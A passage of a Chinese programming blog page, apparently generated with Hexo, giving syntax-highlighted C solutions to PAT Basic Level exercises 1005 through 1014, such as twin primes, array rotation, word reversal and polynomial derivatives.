class="comment">//排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;K<span class="number">-1</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(tmp[j]&gt;tmp[j+<span class="number">1</span>])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">int</span> t = tmp[j+<span class="number">1</span>];</span><br><span class="line">                tmp[j+<span class="number">1</span>] = tmp[j];</span><br><span class="line">                tmp[j] = t;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> z=K<span class="number">-1</span>; z&gt;=<span class="number">0</span>; z--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(tmp[z<span class="number">-1</span>]!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,tmp[z]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"%d"</span>,tmp[z]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">getList</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> *<span class="built_in">list</span> = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(n==<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(n%<span class="number">2</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            n = n/<span class="number">2</span>;</span><br><span class="line">            <span class="built_in">list</span>[i] = n;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            n = (n*<span class="number">3</span>+<span class="number">1</span>)/<span class="number">2</span>;</span><br><span class="line">            <span class="built_in">list</span>[i] = n;</span><br><span class="line">            i++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    Len = i;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">list</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1006-换个格式输出"><a href="#1006-换个格式输出" class="headerlink" title="1006 换个格式输出"></a>1006 换个格式输出</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> b=n/<span class="number">100</span>;</span><br><span class="line">    <span class="keyword">int</span> s=(n%<span class="number">100</span>)/<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">int</span> g=n%<span class="number">10</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;b; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"B"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;s; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"S"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=g; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1007-素数对猜想"><a href="#1007-素数对猜想" class="headerlink" title="1007 素数对猜想"></a>1007 素数对猜想</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> last=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> res = is_Prime(i);</span><br><span class="line">        <span class="keyword">if</span>(res==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(i-last==<span class="number">2</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count++;</span><br><span class="line">            &#125;</span><br><span class="line">            last = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,count);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_Prime</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> limit = <span class="built_in">sqrt</span>(num);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=limit;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(num%i==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1008-数组元素循环右移问题"><a href="#1008-数组元素循环右移问题" class="headerlink" title="1008 数组元素循环右移问题"></a>1008 数组元素循环右移问题</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,m;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;n,&amp;m);</span><br><span class="line">    <span class="keyword">int</span> arr[n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> <span class="built_in">step</span>=<span class="number">0</span>; <span class="built_in">step</span>&lt;m; <span class="built_in">step</span>++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp = arr[n<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>; i&gt;<span class="number">0</span>; i--)</span><br><span class="line">        &#123;</span><br><span class="line">            arr[i] = arr[i<span class="number">-1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        arr[<span class="number">0</span>] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n<span class="number">-1</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,arr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arr[n<span class="number">-1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1009-说反话"><a href="#1009-说反话" class="headerlink" title="1009 说反话"></a>1009 说反话</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str[<span class="number">80</span>][<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,str[i]);</span><br><span class="line">        i++;</span><br><span class="line">        <span class="keyword">if</span>(getchar()==<span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i<span class="number">-1</span>;j&gt;<span class="number">0</span>;j--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,str[j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,str[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1010-一元多项式求导"><a href="#1010-一元多项式求导" class="headerlink" title="1010 一元多项式求导"></a>1010 一元多项式求导</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> xi[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">int</span> zhi[<span class="number">10000</span>];</span><br><span class="line">    <span class="keyword">int</span> index=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;xi[index]);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;zhi[index]);</span><br><span class="line">        index++;</span><br><span class="line">        <span class="keyword">if</span>(getchar()==<span class="string">'\n'</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;index; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(xi[i]!=<span class="number">0</span> &amp;&amp; zhi[i] != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            xi[i] = xi[i]*zhi[i];</span><br><span class="line">            zhi[i] = zhi[i] - <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            xi[i] = <span class="number">0</span>;</span><br><span class="line">            zhi[i] = <span class="number">0</span>;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> t1[index-count],t2[index-count];</span><br><span class="line">    <span class="keyword">int</span> num=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;index; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(xi[i]==<span class="number">0</span>&amp;&amp;zhi[i]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            t1[num] = xi[i];</span><br><span class="line">            t2[num] = zhi[i];</span><br><span class="line">            num++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;index-count<span class="number">-1</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d %d "</span>,t1[i],t2[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d %d"</span>,t1[index-count<span class="number">-1</span>],t2[index-count<span class="number">-1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1011-A-B和C"><a href="#1011-A-B和C" class="headerlink" title="1011 A+B和C"></a>1011 A+B和C</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;t);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;t;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> a,b,c;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d %d %d"</span>,&amp;a,&amp;b,&amp;c);</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">int</span> x=a,y=b,z=c;</span><br><span class="line">        <span class="keyword">if</span>(x+y&gt;z)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Case #%d: true\n"</span>,i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"Case #%d: false\n"</span>,i+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1012-数字分类"><a href="#1012-数字分类" class="headerlink" title="1012 数字分类"></a>1012 数字分类</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> input[n];</span><br><span class="line">    <span class="keyword">int</span> a1=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a2=<span class="number">0</span>,index2=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> *t1 = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">int</span> a3=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a4=<span class="number">0</span>,count=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> a5=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;input[i]);</span><br><span class="line">        <span class="keyword">if</span>(input[i]%<span class="number">10</span>==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a1+=input[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input[i]%<span class="number">5</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            t1[index2] = input[i];</span><br><span class="line">            index2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input[i]%<span class="number">5</span>==<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a3++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input[i]%<span class="number">5</span>==<span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a4+=input[i];</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(input[i]%<span class="number">5</span>==<span class="number">4</span> &amp;&amp; input[i]&gt;a5)</span><br><span class="line">        &#123;</span><br><span class="line">            a5 = input[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a1!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"N "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(index2!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(index2%<span class="number">2</span>!=<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            t1[index2] = <span class="number">0</span>;</span><br><span class="line">            index2++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;index2; i=i+<span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            a2+=t1[i]-t1[i+<span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"N "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a3!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,a3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"N "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(count!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">float</span> t4 = (<span class="keyword">float</span>)a4/count;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%.1f "</span>,t4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"N "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a5!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,a5);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"N"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1013-数素数"><a href="#1013-数素数" class="headerlink" title="1013 数素数"></a>1013 数素数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_Prime</span><span class="params">(<span class="keyword">int</span> num)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> m,n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d %d"</span>,&amp;m,&amp;n);</span><br><span class="line">    <span class="keyword">int</span> nextline=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(is_Prime(num))</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            <span class="keyword">if</span>(i&lt;=n)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(i&gt;=m)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span>(i&lt;n)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="keyword">if</span>(nextline!=<span class="number">9</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%d "</span>,num);</span><br><span class="line">                            nextline++;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                            <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</span><br><span class="line">                            nextline=<span class="number">0</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">"%d"</span>,num);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">is_Prime</span><span class="params">(<span class="keyword">int</span> num)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> limit = <span class="built_in">sqrt</span>(num);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;=limit; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(num%i==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="1014-福尔摩斯的约会"><a href="#1014-福尔摩斯的约会" class="headerlink" title="1014 福尔摩斯的约会"></a>1014 福尔摩斯的约会</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getCh1</span><span class="params">(<span class="keyword">char</span> *str1,<span class="keyword">char</span> *str2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getCh2</span><span class="params">(<span class="keyword">char</span> *str1,<span class="keyword">char</span> *str2,<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getCh3</span><span class="params">(<span class="keyword">char</span> *str1,<span class="keyword">char</span> *str2)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input[<span class="number">4</span>][<span class="number">60</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%s"</span>,input[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ch1 = getCh1(input[<span class="number">0</span>],input[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">char</span> ch2 = getCh2(input[<span class="number">0</span>],input[<span class="number">1</span>],ch1);</span><br><span class="line">    <span class="keyword">int</span> ch3 = getCh3(input[<span class="number">2</span>],input[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">char</span> day[<span class="number">7</span>][<span class="number">4</span>] = &#123;<span class="string">"MON"</span>,<span class="string">"TUE"</span>,<span class="string">"WED"</span>,<span class="string">"THU"</span>,<span class="string">"FRI"</span>,<span class="string">"SAT"</span>,<span class="string">"SUN"</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> *hour=<span class="string">"0123456789ABCDEFGHIJKLMN"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s %02d:%02d"</span>,day[input[<span class="number">0</span>][ch1]<span class="number">-65</span>],<span class="built_in">strchr</span>(hour,ch2)-hour,ch3);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getCh1</span><span class="params">(<span class="keyword">char</span> *str1,<span class="keyword">char</span> *str2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(str1)&gt;=<span class="built_in">strlen</span>(str2))</span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        len = <span class="built_in">strlen</span>(str1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((str1[i]&gt;=<span class="number">65</span> &amp;&amp; str1[i]&lt;=<span class="number">71</span>) &amp;&amp; (str2[i]&gt;=<span class="number">65</span> &amp;&amp; str2[i]&lt;=<span class="number">71</span>) &amp;&amp; str1[i]==str2[i])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">char</span> <span class="title">getCh2</span><span class="params">(<span 